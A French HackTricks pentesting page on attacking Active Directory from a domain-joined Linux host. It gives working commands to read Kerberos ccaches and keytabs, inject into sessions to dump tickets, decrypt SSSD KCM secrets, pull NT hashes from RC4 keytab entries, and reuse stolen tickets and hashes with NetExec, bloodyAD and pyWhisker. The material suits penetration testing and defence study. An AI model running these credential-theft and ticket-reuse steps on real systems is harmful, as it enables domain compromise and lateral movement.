# Active Directory sous Linux

{{#include ../../banners/hacktricks-training.md}}

Une machine Linux peut également être présente dans un environnement Active Directory.

Une machine Linux au sein d'un AD peut **stocker localement du matériel Kerberos** : des ccaches utilisateur, des keytabs de machine/service et des secrets gérés par SSSD. Ces artefacts peuvent généralement être réutilisés comme n'importe quel autre identifiant Kerberos. Pour lire la plupart d'entre eux, vous devrez être le propriétaire utilisateur du ticket ou **root** sur la machine.

## Énumération

### Énumération AD depuis Linux

Si vous avez accès à un AD depuis Linux (ou à bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l'AD.

Vous pouvez également consulter la page suivante pour découvrir **d'autres façons d'énumérer un AD depuis Linux** :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA est une **alternative** open source à **Active Directory** de Microsoft Windows, principalement destinée aux environnements **Unix**. Il combine un **annuaire LDAP** complet avec un centre de distribution de clés MIT **Kerberos** pour une gestion similaire à Active Directory. Utilisant le **Certificate System** Dogtag pour la gestion des certificats CA et RA, il prend en charge l'authentification **multi-facteur**, notamment avec des smartcards. SSSD est intégré aux processus d'authentification Unix. Pour en savoir plus :


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts d'un hôte joint au domaine

Avant de manipuler les tickets, identifiez **comment l'hôte a été joint à l'AD** et **où le matériel Kerberos est réellement stocké**. Sur les hôtes Linux modernes, cela est généralement géré par `realmd` + `adcli` + `sssd`, et pas uniquement par des fichiers plats dans `/tmp` :
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Cela vous indique rapidement si l’hôte fait confiance à AD, si SSSD met en cache les identités ou les tickets, et si des **machine/service keytabs** ou des **KCM secrets** sont disponibles pour être exploités.

## Manipulation des tickets

### Pass The Ticket

Sur cette page, vous trouverez différents endroits où vous pourriez **trouver des tickets Kerberos sur un hôte Linux**. Sur la page suivante, vous apprendrez à convertir ces formats de tickets CCache au format Kirbi (le format dont vous avez besoin sous Windows), ainsi qu’à effectuer une attaque PTT :


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si vous souhaitez consulter les **workflows de récupération de tickets spécifiques à Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consultez la page dédiée :

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Réutilisation de tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires permettant de **stocker des identifiants Kerberos**. `FILE:/tmp/krb5cc_%{uid}` reste courant, mais les déploiements Linux modernes utilisent également `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Vérifiez la variable d’environnement **`KRB5CCNAME`** et le paramètre `default_ccache_name` avant de supposer que les tickets se trouvent dans `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Réutilisation d'un ticket CCACHE depuis le keyring

**Les tickets Kerberos stockés dans la mémoire d'un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cette fin est disponible à l'adresse [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Il facilite l'extraction en s'injectant dans les sessions et en déversant les tickets dans `/tmp`.

Pour configurer et utiliser cet outil, suivez les étapes ci-dessous :
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Cette procédure tentera de s’injecter dans diverses sessions et indiquera la réussite de l’opération en enregistrant les tickets extraits dans `/tmp`, selon la convention de nommage `__krb_UID.ccache`.

### Réutilisation de tickets CCACHE depuis SSSD KCM

SSSD conserve une copie de la base de données à l’emplacement `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée dans un fichier caché à l’emplacement `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, cette clé n’est lisible qu’avec les permissions **root**.

L’appel de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **déchiffrera les secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Le **blob de credential cache Kerberos peut être converti en fichier Kerberos CCache utilisable**, qui peut être fourni à Mimikatz/Rubeus.

### Triage rapide des keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extraire les comptes de /etc/krb5.keytab

Les clés des comptes de service, essentielles au fonctionnement des services avec des privilèges root, sont stockées de manière sécurisée dans les fichiers **`/etc/krb5.keytab`**. Ces clés, comparables à des mots de passe pour les services, doivent rester strictement confidentielles.

Pour inspecter le contenu du fichier keytab, il est possible d'utiliser **`klist`**. Sous Linux, `klist -k -K -e` affiche les principaux, les numéros de version des clés, les types de chiffrement et le matériel cryptographique brut. Si le type de clé est **23 / RC4-HMAC**, sa valeur correspond également au **NT hash** de ce principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Pour les utilisateurs Linux, **`KeyTabExtract`** permet d’extraire le hash RC4 HMAC, qui peut être utilisé pour réutiliser un hash NTLM. Notez que cela ne fonctionne que lorsque le keytab contient encore du matériel **etype 23 / RC4-HMAC**. Dans les environnements **AES-only**, vous n’obtiendrez peut-être pas de hash NT réutilisable, mais vous pourrez toujours vous authentifier directement avec le keytab via Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Sur macOS, **`bifrost`** sert d’outil d’analyse des fichiers keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
En utilisant les informations de comptes et de hachages extraites, des connexions aux serveurs peuvent être établies à l’aide d’outils comme **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Réutiliser le compte machine depuis `/etc/krb5.keytab`

Sur les systèmes joints avec `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contient généralement le **compte ordinateur** ainsi qu'un ou plusieurs **principals hôte/service**. Si vous avez **root**, ne vous contentez pas de le **dump** : utilisez l'un des principals listés par `klist -k` pour demander un TGT et opérer comme l'hôte Linux lui-même.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Cela est particulièrement utile lorsque l’**objet ordinateur** lui-même dispose de droits délégués dans AD ou lorsque l’hôte est autorisé à récupérer d’autres secrets, tels qu’un **gMSA**.

### Réutiliser du matériel Kerberos volé avec des outils AD Linux-first

Une fois que vous disposez d’un `ccache` valide ou d’un keytab utilisable, vous pouvez agir directement sur AD **depuis Linux**, sans devoir convertir préalablement tous les éléments aux formats Windows. De nombreux outils modernes acceptent nativement `KRB5CCNAME` / l’authentification Kerberos :
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ceci constitue un bon lien entre la **Linux post-exploitation** et l’**AD object abuse**. Pour les chemins d’**object-level abuse** eux-mêmes, consultez :

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Les déploiements Linux récents peuvent utiliser directement les **Managed Service Accounts** depuis l’AD. En pratique, cela signifie qu’après avoir compromis un serveur Linux, vous pouvez trouver non seulement le host keytab, mais aussi des keytabs spécifiques aux services générés à partir d’un gMSA. Les emplacements courants à inspecter sont `/etc/gmsad.conf`, les fichiers de configuration propres au déploiement et les fichiers `*.keytab` supplémentaires sous `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Cela vous donne une identité Kerberos réutilisable pour les SPNs liés à ce gMSA **sans toucher à aucun endpoint Windows**. Pour l’abus des gMSA/dMSA **côté domaine** après l’obtention de privilèges plus élevés dans AD, consultez :

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Références

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
